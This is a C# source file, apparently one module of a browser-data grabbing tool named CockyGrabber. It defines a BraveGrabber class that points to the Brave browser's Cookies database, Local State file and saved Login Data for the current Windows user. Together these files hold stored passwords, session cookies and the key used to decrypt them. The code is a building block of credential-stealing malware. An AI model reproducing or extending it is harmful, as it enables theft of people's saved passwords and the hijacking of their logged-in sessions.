using System;

namespace CockyGrabber.Grabbers
{
    public class BraveGrabber : ChromiumGrabber
    {
        public override string ChromiumBrowserCookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies";
            }
        }
        public override string ChromiumBrowserLocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
            }
        }
        public override string ChromiumBrowserLoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data";
            }
        }
    }
}